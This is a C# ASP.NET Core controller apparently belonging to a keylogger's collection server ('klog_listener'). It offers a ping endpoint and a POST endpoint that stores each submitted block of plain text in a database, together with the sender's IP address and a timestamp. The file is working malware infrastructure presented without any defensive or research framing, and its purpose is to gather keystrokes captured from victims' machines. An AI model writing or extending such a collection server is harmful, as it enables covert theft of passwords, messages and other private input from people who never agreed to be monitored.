using System;
using System.Threading.Tasks;
using klog_listener.Contexts;
using klog_listener.Entities;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace klog_listener.Controllers
{
    [ApiController]
    [Route("log")]
    public class KeyLogController : ControllerBase
    {
        private readonly ILogger<KeyLogController> _logger;
        private readonly KeyLogContext _context;

        public KeyLogController(ILogger<KeyLogController> logger, KeyLogContext context)
        {
            _logger = logger;
            _context = context;
        }

        [HttpGet]
        public IActionResult Ping()
        {
            return Ok();
        }

        [HttpPost]
        [Consumes("text/plain")]
        public async Task<IActionResult> Insert([FromBody] string text)
        {
            _logger.LogInformation("> {text}", text);

            await _context.KeyLogs.AddAsync(new KeyLog
            {
                InsertedTime = DateTimeOffset.Now,
                Ip = Request.HttpContext.Connection.RemoteIpAddress.MapToIPv4().ToString(),
                Text = text
            });
            await _context.SaveChangesAsync();

            return Ok();
        }
    }
}
